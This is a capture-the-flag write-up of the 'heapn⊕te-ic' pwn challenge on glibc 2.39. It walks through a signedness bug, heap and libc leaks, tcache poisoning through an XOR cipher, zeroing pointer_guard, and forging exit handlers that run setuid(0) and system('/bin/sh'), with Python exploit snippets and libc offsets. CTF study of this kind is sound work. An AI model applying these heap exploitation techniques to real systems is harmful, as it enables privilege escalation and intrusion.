---
title: "heapn⊕te-ic"
description: "Signed-length bug on glibc 2.39 turns into a heap primitive. Safe-linking leak, unsorted-bin libc leak, tcache poisoning through an XOR cipher, and a forged exit handler chain."
event: "Midnight Flag CTF 2026"
year: 2026
category: pwn
tags: ["heap", "glibc-2.39", "tcache", "safe-linking", "xor", "exit-handlers"]
difficulty: hard
date: "2026-03-15"
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "Midnightctf_2026/heapn⊕te-ic/pub"
featured: true
flagsHidden: false
---

> Heap bug on glibc 2.39 wrapped in an awkward XOR cipher. Final chain
> leaks the safe-linking key, leaks libc, zeros `pointer_guard`, then
> forges two `initial` exit-handler entries so `exit()` runs
> `setuid(0)` followed by `system("/bin/sh")`.

The full exploit (`solve.py`) lives in the [source repository](https://github.com/R3izorr/CTF_writeup/tree/main/Midnightctf_2026/heapn%E2%8A%95te-ic/pub).

## Binary notes

- `chall` / `chall_patched`: Full RELRO, Canary, NX, PIE, IBT, SHSTK.
- Bundled libc: **glibc 2.39**.
- Relevant libc symbols (from the bundled build):
  - `main_arena = 0x203ac0`
  - `initial = 0x204fc0`
  - `system = 0x58750`
  - `setuid = 0x10eac0`
  - `pointer_guard = libc_base + 0x3ba770`

`__free_hook` exists but is **not** the path used. Exit handlers are cleaner on modern glibc.

## Root bug

The interesting code is in `create_message()`:

```c
uVar1 = read_int32();
if ((int)uVar1 < 0x7f) {
    cypher_message(__s + 8, uVar1 & 0xff, *(undefined4 *)(__s + 4));
    __s[(long)(int)(uVar1 & 0xff) + 8] = 0;
    *__s = (char)uVar1;
}
```

- The size check is **signed** (`(int)uVar1 < 0x7f`).
- The stored length is **low byte** only (`*__s = (char)uVar1`).
- So `size = -1` passes the signed check, stored size becomes `0xff`, and XOR runs over `0xff` bytes.

Each message is allocated as `malloc(0x88)` with an 8-byte metadata header. The "valid" buffer is therefore `0x80` bytes, but the code happily touches `0xff` — reaching well into the next chunk at offset `0x88` (= 136).

## The XOR layer

`cypher_message()` is reversible XOR but the decompilation is misleading. The practical model:

1. seed the state with `djb2(str(seed))`.
2. serialize as 64-bit little-endian.
3. every 8 bytes, rehash the previous value with `djb2(str(cur))`.
4. XOR the message with this rolling 8-byte keystream.

Block index for offset 136 is `136 / 8 = 17`. The helpers `djb2()`, `block_value()`, and `keystream()` in `solve.py` model this exactly.

## Heap leak (safe-linking)

1. Allocate 10 chunks of the same size.
2. Free chunk 9, then chunk 8.
3. Reallocate chunk 8 with `size = -1`.
4. Overread chunk 9's first qword → `NULL ^ (chunk_page >> 12)` — the safe-linking key for that heap page.

```python
self.delete(9)
self.delete(8)
self.create(-1, b"X" * 8, 0)
self.heap_key = u64(self.viewn(8, 256)[136:144])
```

## Libc leak (unsorted-bin)

Same size class (`0x90`) has a 7-slot tcache. Fill tcache, push the 8th free into the unsorted bin, then overread its `fd`:

```python
for idx in range(3, 8):
    self.delete(idx)
self.delete(0)
self.delete(1)
self.create(-1, b"Y" * 8, 0)
unsorted_fd = u64(self.viewn(0, 256)[136:144])
libc.address = unsorted_fd - (libc.sym["main_arena"] + 0x60)
```

## XOR → tcache poisoning

XOR is linear. Each seed produces a deterministic keystream block at offset 136, so the set of achievable deltas to a freed chunk's `next` pointer is a vector space over GF(2). `Exploit._build_basis()` builds a 64-bit basis of seeds, and `Exploit.solve_delta()` solves any target delta as a XOR sum.

The primitive becomes:

```python
def poison_target(self, c_idx, b_idx, a_idx, target_addr):
    self.delete(c_idx)
    self.delete(b_idx)
    self.delete(a_idx)

    self.create(-1, b"Z" * 8, 0)
    raw_next = u64(self.viewn(c_idx, 256)[136:144])
    current = raw_next ^ self.k0
    target = target_addr ^ self.heap_key

    for seed in self.solve_delta(current ^ target):
        self.delete(c_idx)
        self.create(-1, b"Q" * 8, seed)

    self.create(8, b"P" * 8, 0)
```

## Defeating pointer mangling

`glibc` exit handlers use `PTR_MANGLE`, gated by `pointer_guard` in TLS (`libc_base + 0x3ba770` here). Poison tcache onto that address, then allocate with `size = 0`:

```python
ptr_guard = libc.address + POINTER_GUARD_OFFSET
self.poison_target(1, 5, 6, ptr_guard)
self.create(0, b"", 0)
```

`size = 0` writes a single zero byte — big enough to zero the guard, small enough to not spray nearby TLS (stack canary, etc.). With `guard = 0`:

```text
PTR_MANGLE(p) = rol64(p ^ guard, 17) = rol64(p, 17)
```

## Forging the exit handler list

Tcache-poison one more allocation onto `libc.sym["initial"]` and write a fake
`exit_function_list` with two entries. Handlers run **in reverse order**, so
indexing them as `[ setuid(0), system("/bin/sh") ]` produces the right
runtime call order:

```python
exit_blob = flat(
    [
        2,
        4,
        rol64(libc.sym["system"], 17),
        next(libc.search(b"/bin/sh\x00")),
        0,
        4,
        rol64(libc.sym["setuid"], 17),
        0,
        0,
    ],
    word_size=64,
)
```

`fgets()` bans `\n` in stored messages, so `encode_payload()` brute-forces a seed whose XOR keystream yields payload bytes free of newlines.

## Trigger

Menu option `4` calls `exit(0)`. Glibc walks the forged list and the shell opens.

## Takeaways

- A one-byte signedness bug can turn into a strong heap primitive when the program stores the truncated length.
- Safe-linking is not a barrier if you can leak the heap key first.
- On modern glibc, `exit` machinery is often a better target than the old hooks.
- Pointer mangling is only as strong as `pointer_guard`'s secrecy.
